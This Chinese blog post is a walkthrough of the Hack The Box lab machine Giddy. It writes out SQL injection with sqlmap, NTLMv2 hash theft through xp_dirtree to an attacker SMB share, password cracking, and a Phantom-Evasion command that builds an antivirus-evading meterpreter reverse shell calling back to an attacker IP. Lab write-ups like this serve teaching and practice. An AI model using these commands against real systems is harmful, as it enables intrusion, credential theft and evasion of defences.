> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/koIyMD1F4m4L5YGBe4U1KA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **78** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/153

靶机难度：中级（5.0/10）

靶机发布日期：2019 年 2 月 12 日

靶机描述：

Giddy is a medium difficulty machine, which highlights how low privileged SQL Server logins can be used to compromise the underlying SQL Server service account. This is an issue in many environments, and depending on the configuration, the service account may have elevated privileges across the domain. It also features Windows registry enumeration and custom payload creation.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

一、信息收集

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KeubMzemSGicf2I6zFspQjrGOUF4f4GY31TKNE6HzQXicaGW9n3HVk42g/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.90....

这里的思路：

Giddy 是一台中等难度的计算机，它着重介绍了如何使用低特权的 SQL Server 登录名来破坏基础 SQL Server 服务帐户。在许多环境中，这是一个问题，根据配置，服务帐户可能在整个域中具有提升的特权。它还具有 Windows 注册表枚举和自定义有效负载创建的功能。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9K5Un6R5MhEickiaNDmUiccvd1ibxpic7EmMEREJlb6IiaBlnOLspKMQQgMcQQ/640?wx_fmt=png)

nmap 发现开放了 80 和 443 端口，并且 windows server IIS 10.0....3389 端口也开放着...

https 页面还可以使用 powershell... 那就进入页面就能成功了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KU9FJqyYS2r1P89ibrmibkRt1sWL2734SIVUSyibMDjhM3TeqY4XQzhuVA/640?wx_fmt=png)

一条可爱的狗...443 端口也是一模一样的界面...

这里直接利用 gobuster 爆破目录好了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KzZcibEibBdRGBwa51PxNXCvOpd2Cgy1Nr4wbh7ns2NJcibcibL7stRPJicA/640?wx_fmt=png)

```
gobuster dir -w directory-list-2.3-medium.txt -u http://10.10.10.104/
```

发现了 / remote 目录，访问...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KfwZauQ8xic2mvZgaYYDOhPnDuqFuVEgZxIbia5lPeicWsbH9bOpqfmh6A/640?wx_fmt=png)

可以看到重定向到了 Windows PowerShell Web Access...

提醒我们该网站使用安全套接字层（SSL）协议，并且需要 HTTPS 地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KkrBL6cb4CAsYMCIvpKtmibDmDiaRpvstJXjy9sAPEm6AEfbVbtnIOcpA/640?wx_fmt=png)

OK，按照他说做...

这里需要用户名和密码进行登陆，目前都没... 继续访问 mvc...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9K41LmhdQlS6CC7ibX0DvdNbuPs56rFzIficMZH6hpYV9w3nvWCAp1qkGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9K8aK8M8icAmyUe8Fe6YXE4vF2zmc0ia9M7ibI4qFMynn4JnsWYkqv04drA/640?wx_fmt=png)

登陆这是一个产品列表，进去可以看到价格...

关注到该页面地址：

```
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=26
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KcTan7u3tCT3XXO63UvmFZ9dBxI7dtqN9EcpyYhQh8wAR8jmQrvVfjQ/640?wx_fmt=png)

随意加个字符，发现存在 sql 错误信息... 提示引号字符串错误... 这里利用 sqlmap 注入看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KH9tDvfjCPgMGSoGXF2HGmT37B6yExPyVqt6PrQXwRxhNEicibIvvibGGQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KdbAfvOklHd2tTVUWRlB6BHA8UMNgTy5MS6dCx6wVKsoBcAoSXVr0ibA/640?wx_fmt=png)

可以看到，正在以 MSSQL 作为 DBMS 运行着... 可以强制 MSSQL 服务器重新连接以与 SMB 一起使用，然后使用响应程序来获取 NTLMv2 哈希...

MSSQL 支持堆叠查询，因此可以创建一个指向我们 IP 地址的变量，然后使用该 xp_dirtree 函数列出 SMB 共享中的文件并获取 NTLMv2 哈希.

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KtbTv3LKj0R8bZMftLeaaR5rVd4RrV8bqicc6dibG2icMkInqWhXCzZHXA/640?wx_fmt=png)

```
python3 smbserver.py dayu pwd
sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=26 --sql-shell
EXEC master..xp_dirtree '\\10.10.14.11\dayu'
```

成功获得用户和哈希值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9K5ziczqSESf9I8wkAdsVeic61f1pjymBES27pLmWSEpXWApakxiaZb6GDw/640?wx_fmt=png)

利用 john 解析了密码：

```
xNnWo6272k7x
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9K6FvgqxCePyrhCsmHMxMbzdkS0Rttxg1KXneedlPDicG3RaTZJokMkicA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KiaOtoia1S5DXxSFSib9dLA6Pob4Pc6Xr0pVaIsRGQWbh03cjmiaLh9gicZg/640?wx_fmt=png)

成功登陆... 果然前面 nmap 也发现了 powershell...

直接利用即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KXrQYeuZmib3ezmBJI1sOmjtE6JBq9OMxDy9HDxnXnjiaYqalmHjdF54Q/640?wx_fmt=png)

成功获得 user 信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KKhPw3RDXibRzslx1iaZB7CwqGghgdGtvmF0qwwqccRMJicwgQmr7DfBZA/640?wx_fmt=png)

unifivideo 是一个功能强大且灵活的集成 IP 视频管理监视系统，在与 Ubiquiti 的 UniFi Video Camera 产品系列一起使用，UniFi Video 具有直观，可配置和功能丰富的用户界面，具有高级功能，例如运动检测，自动发现，用户级安全性，存储管理，报告和移动设备支持...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KCxDzrxStmnibwlTbJDR4nGTs0It6vOc5Vmr2DmVE61s0Qcr31mXWxibA/640?wx_fmt=png)

可以看到 unifivideo 可利用得漏洞 CVE-2016-6914，使用 43390EXP 进行提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KwsQARjnuGPJ42QZ5ZqRFho99q3ibEedTr1tziazBFYR9NKzmBFcVcibTg/640?wx_fmt=png)

在启动 Ubiquiti UniFi Video 服务时，它将尝试执行一个名为的文件 taskkill.exe 程序，只需要将创建好的恶意程序放置到 taskkill.exe 中，然后重新启动服务即可提权... 按照 EXP 的意思做...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KCz1j2iaD9RgsSXwmzVrKjf5FoT1ribIkMia1wrHy3ZOox3qRjzzXdBlKQ/640?wx_fmt=png)

确认是存在 UniFi Video 的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KTZqfK8AQKagoib8u3iaKI0j0IydL1AeDbSXIyiajQkrMiaqKFJj38P5awg/640?wx_fmt=png)

本地创建一个 taskkill.exe 的 shellcode... 然后上传即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KgCopL8ICXRTImjnEZz4fnLB7aiclYNCg4gVLEria12UXYdbiaNickaFrrg/640?wx_fmt=png)

没成功....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KYe5lwxUV6U5tXgGzO9iaic93HNvLLNEwzvuzSQ5TKcBUjO2CjPIicN0cg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KMSicH1gBCNibylOWgKHstN53UM2CFRse4PrAwOMHDSIcrCr6viaEMU0sw/640?wx_fmt=png)

可以发现程序没了... 有防病毒模块开启着，把我在启动 Ubiquiti UniFi Video 服务后，立马删除了...

这里利用

```
[Phantom-Evasion](https://github.com/oddcod3/Phantom-Evasion)
```

程序进行绕过... 很强大的工具...  

python3 phantom-evasion.py --setup 记得更新包...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KTkaYzSZwCianG7bN8FF8u798PSuD91ibXocKV3cehYzArD8fibSe8CLmQ/640?wx_fmt=png)

**介绍：**Phantom-Evasion 是一种使用 python 编写的防病毒逃避工具（均与 python 和 python3 兼容），即使使用最常见的 x86 msfvenom 有效负载，它也能够生成（几乎）完全无法检测到的可执行文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KJibq2ficj8QUgTh7Lib9Q6JOM7yDRDH1HDQSKyUV4THabhBgqoPAZYwvw/640?wx_fmt=png)

这里有帮助命令...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9Kwmj6mBcXlnncuCp6uOp5bLgNbZJKibqrMcqqFehOubjbKea5P3oDuYg/640?wx_fmt=png)

这里利用直接生成欺骗性恶意程序....：Windows Shell 代码注入，输出带有欺骗性 https 证书的签名 exe，本地执行方法：线程，内存：Virtual_RWX，加密：vigenere....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9KqDwP2a4njpG1bHibpic7XOJo92Q2FicTwR445pI2ezu6AoC1EjVFJ7ticA/640?wx_fmt=png)

```
python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 10.10.14.11 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -c www.windows.com:443 -f exe -o taskkill.exe
```

生成 taskkill.exe... 导入即可提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMTpBDhmW2a9aksmhZm6F9K6HRuldxnEgnOKCfDkOwxvzWYKVq6sxhUaTmoicWuQmGPEibmFwRt7kgg/640?wx_fmt=png)

开启 MSF 监听方便点... 然后上传 taskkill... 成功提权获得 root 信息...

这里还可以利用：

```
https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp
```

![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?wx_fmt=png)

或者 Ebowla github 封装 msf 生成的. exe

等等，应该还有很多方法绕开提权....

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?wx_fmt=gif)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)